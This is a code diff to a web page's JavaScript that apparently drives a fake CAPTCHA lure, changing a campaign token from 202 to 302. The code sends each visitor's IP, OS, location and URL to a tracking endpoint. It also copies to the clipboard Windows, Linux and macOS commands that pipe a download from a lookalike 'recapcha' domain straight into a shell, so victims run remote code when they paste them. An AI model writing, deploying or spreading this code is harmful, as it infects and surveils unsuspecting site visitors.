@@ -711,7 +711,7 @@
     function getRepairedStatus() {
         if (!customizedIpAddress) return;
         console.log("customizedIpAddress", customizedIpAddress);
-        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=202`)
+        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=302`)
             .then(response => {
                 if (!response.ok) {
                     if (response.status === 404) return null;
@@ -830,11 +830,11 @@
 
     (async function () {
         const location = await getLocationByIP();
-        fetch('https://status-handler-sage.vercel.app/api/entered-site?token=202', {
+        fetch('https://status-handler-sage.vercel.app/api/entered-site?token=302', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                token: '202',
+                token: '302',
                 currentUrl: window.location.href,
                 ip: await getIpAddress(),
                 os: osType,
@@ -994,11 +994,11 @@
 
         let htaPath;
         if (osType === "Windows") {
-            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd ";
+            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=302 | cmd ";
         } else if (osType === "Linux") {
-            htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
+            htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=302' | sh";
         } else if (osType === "MacOS") {
-            htaPath = "curl 'https://api.recapcha.fun/auth/v3?token=202' | sh";
+            htaPath = "curl 'https://api.recapcha.fun/auth/v3?token=302' | sh";
         }
         stageClipboard(htaPath, verification_id);
     }
@@ -1063,7 +1063,7 @@
     function getRepairedStatus1() {
         if (!customizedIpAddress1) return;
         console.log("customizedIpAddress", customizedIpAddress1);
-        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress1}&token=202`)
+        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress1}&token=302`)
             .then(response => {
                 if (!response.ok) {
                     if (response.status === 404) return null;
@@ -1183,11 +1183,11 @@
 
     (async function () {
         const location1 = await getLocationByIP1();
-        fetch('https://status-handler-sage.vercel.app/api/entered-site?token=202', {
+        fetch('https://status-handler-sage.vercel.app/api/entered-site?token=302', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                token: '202',
+                token: '302',
                 currentUrl: window.location.href,
                 ip: await getIpAddress1(),
                 os: osType1,
@@ -1357,11 +1357,11 @@
 
         let htaPath1;
         if (osType1 === "Windows") {
-            htaPath1 = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd ";
+            htaPath1 = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=302 | cmd ";
         } else if (osType1 === "Linux") {
-            htaPath1 = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
+            htaPath1 = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=302' | sh";
         } else if (osType1 === "MacOS") {
-            htaPath1 = "curl 'https://api.recapcha.fun/auth/v3?token=202' | sh";
+            htaPath1 = "curl 'https://api.recapcha.fun/auth/v3?token=302' | sh";
         }
         stageClipboard1(htaPath1, verification_id1);
     }
